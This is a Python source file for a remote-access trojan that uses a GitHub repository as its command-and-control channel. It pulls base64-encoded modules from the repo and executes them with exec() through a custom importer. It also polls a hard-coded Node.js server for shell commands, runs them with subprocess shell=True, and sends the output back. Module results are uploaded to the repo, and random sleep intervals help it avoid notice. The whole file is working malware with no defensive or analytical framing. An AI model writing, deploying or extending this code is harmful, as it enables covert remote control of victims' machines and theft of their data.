import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
import subprocess
import requests
from datetime import datetime

def github_connect():
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'hacksparkdev'
    sess = github3.login(token=token)
    return sess.repository(user, 'Trojan')

def get_file_contents(dirname, module_name, repo):
    try:
        file = repo.file_contents(f'{dirname}/{module_name}')
        return file.content
    except github3.exceptions.NotFoundError:
        print(f"[*] File '{dirname}/{module_name}' not found in repository.")
        return None

class Trojan:
    def __init__(self, id, node_server_url):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{self.id}/'
        self.repo = github_connect()
        self.node_server_url = node_server_url
        self.running = True

    def get_github_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        if config_json:
            return json.loads(base64.b64decode(config_json).decode('utf-8'))
        return {}

    def get_nodejs_config(self):
        try:
            response = requests.get(f"{self.node_server_url}/config")
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"[*] Failed to get config from Node.js server: {e}")
            return None

    def send_command_result(self, command, result):
        try:
            payload = {
                "command": command,
                "result": result
            }
            requests.post(f"{self.node_server_url}/command", json=payload)
        except requests.exceptions.RequestException as e:
            print(f"[*] Failed to send command result to Node.js server: {e}")

    def update_status(self, status):
        try:
            payload = {
                "id": self.id,
                "status": status
            }
            requests.post(f"{self.node_server_url}/status", json=payload)
        except requests.exceptions.RequestException as e:
            print(f"[*] Failed to update status on Node.js server: {e}")

    def execute_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            result = result.decode('utf-8')
        except subprocess.CalledProcessError as e:
            result = e.output.decode('utf-8')
        self.send_command_result(command, result)

    def module_runner(self, module_name):
        print(f"[*] Attempting to run module '{module_name}'")
        if module_name in sys.modules:
            try:
                result = sys.modules[module_name].run()
                self.store_module_result(result)
            except AttributeError:
                print(f"[*] Module '{module_name}' does not have a 'run' method.")
            except Exception as e:
                print(f"[*] Error running module '{module_name}': {e}")
        else:
            print(f"[*] Module '{module_name}' not found in sys.modules. Trying to load it now...")
            importlib.invalidate_caches()
            try:
                module_code = get_file_contents('modules', f'{module_name}.py', self.repo)
                if module_code:
                    print(f"[*] Module code retrieved successfully for '{module_name}'")
                    exec(base64.b64decode(module_code).decode('utf-8'), globals())
                    # Check if the module was properly loaded
                    if module_name in globals():
                        sys.modules[module_name] = globals()[module_name]
                        print(f"[*] Module '{module_name}' successfully loaded.")
                        result = sys.modules[module_name].run()
                        self.store_module_result(result)
                    else:
                        print(f"[*] Module '{module_name}' not found after executing code.")
                else:
                    print(f"[*] Failed to retrieve module code for '{module_name}'.")
            except Exception as e:
                print(f"[*] Error loading module '{module_name}': {e}")

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
        self.repo.create_file(remote_path, message, bindata)

    def run(self):
        while self.running:
            # Fetch configuration from GitHub
            github_config = self.get_github_config()

            # Fetch real-time commands from Node.js server
            nodejs_config = self.get_nodejs_config()

            if nodejs_config:
                if nodejs_config.get('stop'):
                    self.running = False
                    self.update_status("Trojan stopped.")
                    break

                # Execute commands from Node.js server
                for command in nodejs_config.get('commands', []):
                    if isinstance(command, str):
                        self.execute_command(command)
                    elif isinstance(command, dict):
                        module = command.get('module')
                        if module:
                            self.module_runner(module)

            # Run modules based on GitHub config
            for task in github_config.get('modules', []):
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30*60, 3*60*60))

class GitImporter:
    def __init__(self):
        self.repo = github_connect()
        self.current_module_code = ""

    def find_spec(self, fullname, path, target=None):
        print(f"[*] Attempting to retrieve {fullname}")
        try:
            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
            if new_library:
                self.current_module_code = base64.b64decode(new_library).decode('utf-8')
                return importlib.util.spec_from_loader(fullname, loader=self)
        except github3.exceptions.NotFoundError:
            print(f"[*] Module {fullname} not found in repository.")
        return None

    def create_module(self, spec):
        return None

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    NODE_SERVER_URL = "http://10.0.100.100:3000"  # Change this to your Node.js server URL
    trojan = Trojan('abc', NODE_SERVER_URL)
    trojan.run()

